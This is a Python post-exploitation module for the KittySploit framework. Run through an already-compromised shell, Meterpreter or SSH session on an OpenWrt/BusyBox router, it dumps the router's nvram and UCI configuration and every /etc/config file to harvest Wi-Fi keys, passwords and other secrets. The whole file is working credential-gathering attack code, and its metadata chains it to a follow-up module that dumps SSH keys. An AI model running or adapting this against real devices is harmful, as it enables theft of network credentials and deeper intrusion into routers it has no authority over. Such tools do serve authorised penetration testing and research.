#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Dump OpenWrt nvram / UCI configuration from an embedded shell."""

from kittysploit import *
from lib.post.linux.session import LinuxSessionMixin
import os
import re
import time


class Module(Post, LinuxSessionMixin):
    __info__ = {
        "name": "OpenWrt / BusyBox Dump NVRAM UCI",
        "description": (
            "Dump router configuration via nvram show, uci export, and common "
            "config paths (/etc/config, /tmp/nvram)."
        ),
        "author": "KittySploit Team",
        "platform": Platform.LINUX,
        "session_type": [SessionType.SHELL, SessionType.METERPRETER, SessionType.SSH],
        "tags": ["iot", "openwrt", "busybox", "gather", "credentials"],
        "references": ["https://attack.mitre.org/techniques/T1552/"],
        "agent": {
            "risk": "active",
            "effects": ["reconnaissance"],
            "produces": ["risk_signals"],
            "chain": {
                "consumes_capabilities": ["shell"],
                "produces_capabilities": ["credentials", "file_read"],
                "suggested_followups": [
                    "post/shell/linux/busybox/dump_dropbear_keys",
                ],
            },
        },
    }

    save_local = OptBool(True, "Save dump under ./output", False)
    redact_secrets = OptBool(
        False,
        "Redact obvious password= values in console output (file keeps full dump)",
        False,
    )

    def run(self):
        if not self.linux_require_linux():
            return False

        sections = []
        print_status("Dumping nvram / UCI / config files...")

        for cmd, label in (
            ("uci export 2>/dev/null", "uci export"),
            ("nvram show 2>/dev/null", "nvram show"),
            ("cat /tmp/nvram 2>/dev/null", "/tmp/nvram"),
            ("ls /etc/config 2>/dev/null", "/etc/config listing"),
        ):
            out = (self.cmd_execute(cmd) or "").strip()
            if out and "not found" not in out.lower():
                sections.append(f"=== {label} ===\n{out}")
                print_success(f"{label}: {len(out.splitlines())} line(s)")

        # Key UCI packages often holding secrets
        for pkg in ("network", "wireless", "system", "dropbear", "firewall", "dhcp"):
            out = (self.cmd_execute(f"uci show {pkg} 2>/dev/null") or "").strip()
            if out:
                sections.append(f"=== uci show {pkg} ===\n{out}")

        conf = (
            self.cmd_execute(
                "for f in /etc/config/*; do echo \"===== $f =====\"; cat \"$f\" 2>/dev/null; done"
            )
            or ""
        ).strip()
        if conf:
            sections.append(f"=== /etc/config/* ===\n{conf}")

        if not sections:
            print_warning("No nvram/uci output (not OpenWrt, or tools missing)")
            return True

        report = "\n\n".join(sections)
        display = report
        if bool(self.redact_secrets):
            display = re.sub(
                r"(?i)(password|passwd|key|psk|secret)\s*[:=]\s*\S+",
                r"\1=***",
                display,
            )
        print_info(display[:4000] + ("\n...[truncated]..." if len(display) > 4000 else ""))

        if bool(self.save_local):
            os.makedirs("output", exist_ok=True)
            stamp = time.strftime("%Y%m%d_%H%M%S")
            path = os.path.join("output", f"openwrt_nvram_{stamp}.txt")
            with open(path, "w", encoding="utf-8", errors="replace") as fh:
                fh.write(report + "\n")
            print_success(f"Saved ./{path}")
        print_success("NVRAM/UCI dump completed")
        return True
